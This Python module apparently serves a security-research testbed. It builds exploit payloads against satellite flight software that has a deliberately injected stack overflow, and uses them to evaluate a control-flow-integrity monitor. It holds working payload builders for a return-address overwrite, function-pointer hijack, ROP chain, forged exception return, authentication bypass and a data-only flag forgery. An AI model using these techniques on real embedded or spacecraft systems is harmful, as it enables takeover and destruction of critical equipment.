"""The five controlled attacks against the flight software.

Every attack rides the single injected vulnerability in tc_handle_frame():
the LEN field of a telecommand is trusted as the copy length into a 64-byte
stack buffer.

Stack layout of tc_handle_frame(), measured from the first byte of ctx.buf
(which is where the overflowing copy starts):

    offset  0 .. 63   ctx.buf[64]
    offset 64         ctx.handler          <- indirect call target
    offset 76         saved r7
    offset 80         saved LR             <- popped into PC on return
    offset 84         (gadget's popped r7)
    offset 88         (gadget's popped PC) <- second ROP stage
"""
from __future__ import annotations

import re
import struct
import subprocess

OFF_HANDLER = 64
OFF_SAVED_R7 = 76
OFF_SAVED_LR = 80
OFF_ROP_R7 = 84
OFF_ROP_PC = 88

APID_ADCS_MODE = 0x10
APID_PARAM_SET = 0x50
APID_PRIV_WRITE = 0x60
APID_WD_LOAD = 0x70
APID_WD_FIRE = 0x71
AUTH_FLAG_INDEX = 8      # g_state.params[8] IS g_state.authenticated


def _w(v: int) -> bytes:
    return struct.pack("<I", v)


def _canvas(size: int, filler: bytes = b"A") -> bytearray:
    return bytearray(filler * size)


def _place(buf: bytearray, off: int, word: int) -> None:
    buf[off:off + 4] = _w(word)


def find_pop_r7_pc_gadget(elf: str, cross: str = "arm-none-eabi-") -> int:
    """Locate a `pop {r7, pc}` gadget in the image (Thumb encoding bd80)."""
    out = subprocess.check_output([cross + "objdump", "-d", elf], text=True)
    for line in out.splitlines():
        if "bd80" in line and "pop" in line and "{r7, pc}" in line:
            return int(line.split(":")[0].strip(), 16) | 1
    raise RuntimeError("no pop {r7, pc} gadget found")


# --------------------------------------------------------------------------
# ATK-1 - Buffer overflow: overwrite the saved return address.
# The handler slot must stay valid, otherwise the indirect call crashes
# before the function ever returns.
# --------------------------------------------------------------------------
def atk1_buffer_overflow(sym) -> bytes:
    p = _canvas(84)
    _place(p, OFF_HANDLER, sym.thumb("h_tm_beacon"))
    _place(p, OFF_SAVED_R7, 0x20000000)
    _place(p, OFF_SAVED_LR, sym.thumb("eps_kill_switch"))
    return bytes(p)


# --------------------------------------------------------------------------
# ATK-2 - Function pointer corruption: hijack the dispatch pointer only.
# The return address is left intact, so the frame returns normally
# afterwards; only the indirect call is diverted.
# --------------------------------------------------------------------------
def atk2_function_pointer(sym) -> bytes:
    p = _canvas(68)
    _place(p, OFF_HANDLER, sym.thumb("payload_wipe"))
    return bytes(p)


# --------------------------------------------------------------------------
# ATK-3 - ROP: two-stage chain through a `pop {r7, pc}` gadget.
# Return goes to the gadget, the gadget pops the real target off the stack.
# --------------------------------------------------------------------------
def atk3_rop_chain(sym, gadget: int) -> bytes:
    p = _canvas(92)
    _place(p, OFF_HANDLER, sym.thumb("h_tm_beacon"))
    _place(p, OFF_SAVED_R7, 0x20000000)
    _place(p, OFF_SAVED_LR, gadget)
    _place(p, OFF_ROP_R7, 0x20000000)
    _place(p, OFF_ROP_PC, sym.thumb("payload_wipe"))
    return bytes(p)


# --------------------------------------------------------------------------
# ATK-4 - Malicious task scheduling: divert into a leftover debug hook that
# spawns a task above the ADCS priority, starving the attitude control loop.
# --------------------------------------------------------------------------
def atk4_task_scheduling(sym) -> bytes:
    p = _canvas(84)
    _place(p, OFF_HANDLER, sym.thumb("h_tm_beacon"))
    _place(p, OFF_SAVED_R7, 0x20000000)
    _place(p, OFF_SAVED_LR, sym.thumb("debug_spawn_rogue_task"))
    return bytes(p)


# --------------------------------------------------------------------------
# ATK-5 - Unauthorized privileged function: jump straight into the body of
# priv_raw_write(), skipping the authentication check in its entry.
# --------------------------------------------------------------------------
def atk5_privileged_call(sym) -> bytes:
    p = _canvas(84)
    _place(p, OFF_HANDLER, sym.thumb("h_tm_beacon"))
    _place(p, OFF_SAVED_R7, 0x20000000)
    _place(p, OFF_SAVED_LR, sym.thumb("priv_raw_write_body"))
    return bytes(p)


# --------------------------------------------------------------------------
# ATK-6 - Forged exception return.
#
# The only attack here that executes in exception context. The safety-monitor
# interrupt handler copies the armed watchdog message into a 16-byte buffer on
# its own stack without checking the length. The handler is entered straight
# from the vector table, so exactly one frame separates that buffer from the
# value its epilogue pops into the PC:
#
#     offset  0..15   local[16]
#     offset 16       saved r7
#     offset 20       saved LR = EXC_RETURN (0xFFFFFFFD)
#
# Overwriting offset 20 with a code address means `pop {r7, pc}` never leaves
# exception context: it jumps to the attacker's target instead.
#
# No control-flow graph contains this transfer, because no CFG contains any
# exception return. A monitor that exempts exception returns - as this one did
# before the shadow stack was added - accepts it silently.
# --------------------------------------------------------------------------
OFF_WD_EXC_RETURN = 20
WD_PAYLOAD_LEN = 24


def atk6_forged_exception_return(sym) -> bytes:
    p = _canvas(WD_PAYLOAD_LEN, b"C")
    _place(p, OFF_WD_EXC_RETURN, sym.thumb("eps_kill_switch"))
    return bytes(p)


def atk6_frames(sym, seg: int = 48) -> list[tuple[int, bytes]]:
    """Load the message, then arm it. Segmenting the uplink is ordinary on a
    space link, and here it also keeps each frame inside the parser's buffer
    so that loading the message does not itself trip ATK-1."""
    payload = atk6_forged_exception_return(sym)
    out = [(APID_WD_LOAD, bytes([off]) + payload[off:off + seg])
           for off in range(0, len(payload), seg)]
    out.append((APID_WD_FIRE, bytes([len(payload)])))
    return out


# --------------------------------------------------------------------------
# S5 - Data-only attack. The boundary case: no control flow is diverted at
# all. Two well-formed telecommands, each taking a path the CFG allows.
#
#   1. param_set(index=8) walks off the end of the parameter table and lands
#      on g_state.authenticated, setting it to 1.
#   2. A legitimate privileged telecommand then passes the authentication
#      check it should have failed.
#
# Every edge the monitor observes is legal, because every edge IS legal. The
# mission is lost anyway. This is what trace-based CFI cannot see.
# --------------------------------------------------------------------------
def s5_data_only() -> list[tuple[int, bytes]]:
    forge_auth = bytes([AUTH_FLAG_INDEX]) + _w(1)
    priv_write = _w(0x20000000) + _w(0xDEADBEEF)
    return [(APID_PARAM_SET, forge_auth), (APID_PRIV_WRITE, priv_write)]


ATTACKS = {
    "ATK-1": ("Buffer overflow (saved return address)", atk1_buffer_overflow),
    "ATK-2": ("Function pointer corruption", atk2_function_pointer),
    "ATK-3": ("ROP / control-flow hijacking", atk3_rop_chain),
    "ATK-4": ("Malicious task scheduling", atk4_task_scheduling),
    "ATK-5": ("Unauthorized privileged function", atk5_privileged_call),
}

# Not in ATTACKS: S5 is not a control-flow attack, and grouping it with the
# others would misrepresent what the monitor is being asked to do.
